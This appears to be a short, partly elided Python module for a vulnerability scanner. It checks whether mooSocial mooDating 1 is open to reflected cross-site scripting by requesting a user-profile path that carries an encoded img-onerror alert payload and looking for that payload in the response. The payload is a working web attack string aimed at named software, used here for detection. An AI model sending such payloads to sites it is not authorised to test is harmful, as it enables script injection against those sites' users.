#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability classified as problematic was found in mooSocial mooDating 1."""
...
class Module(Scanner, Http_client):
    ...
    def run(self):
        r = self.http_request(method="GET", path='/users/viewi1omd%22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3el43yn/108?tab=activity', allow_redirects=False)
        ...
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                ...
                path='/users/viewi1omd%22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3el43yn/108?tab=activity',
            )
            return True
        return False
